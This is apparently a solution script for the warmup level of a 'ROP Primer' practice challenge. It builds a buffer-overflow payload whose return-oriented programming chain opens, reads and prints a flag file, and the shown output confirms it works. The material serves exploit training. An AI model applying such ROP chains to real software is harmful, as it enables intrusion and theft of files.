ROP Primer - level0 (warmup)

First ROP chain simple opens, reads and then writes the 'flag' file

Usage:
level0@rop:~$ python ./level0-1.py | ./level0
[+] ROP tutorial level0
[+] What's your name? [+] Bet you can't ROP me, /home/level0/flag!
flag{rop_the_night_away}
��Segmentation fault



import struct

flag_path = '/home/level0/flag\x00'

output = ''
output += flag_path + 'A' * (40 - len(flag_path))
output += 'XXXX'
output += struct.pack('I', 0x8051740)           # open call (1)
output += struct.pack('I', 0x8048883)           # pop pop ret (->2)
# output += struct.pack('I', 0xbffff6d0)        # Addr of flag_path (debug) (1)
output += struct.pack('I', 0xbffff700)          # Addr of flag_path (nondebug) (1)
output += '\x00' * 4                            # READONLY flag for open (1)
output += struct.pack('I', 0x80517f0)           # read call (2)
output += struct.pack('I', 0x8048882)           # pop pop pop ret (->3)
output += struct.pack('I', 3)                   # FD from open
output += struct.pack('I', 0xbffff714)  # Space on stack (nondebug) (2)
# output += struct.pack('I', 0xbffff6e4)        # Space on stack (debug) (2)
output += struct.pack('I', 32)                  # Number of bytes to read
output += struct.pack('I', 0x8051850)           # write call
output += struct.pack('I', 0x8048b601)          # exit call
output += struct.pack('I', 1)                   # stdout
output += struct.pack('I', 0xbffff714)  # Space on stack (nondebug) (2)
output += struct.pack('I', 32)                  # Number of bytes to read
output += 'BBBB' + 'CCCC' + 'DDDD' + 'EEEE'      # (3)

print output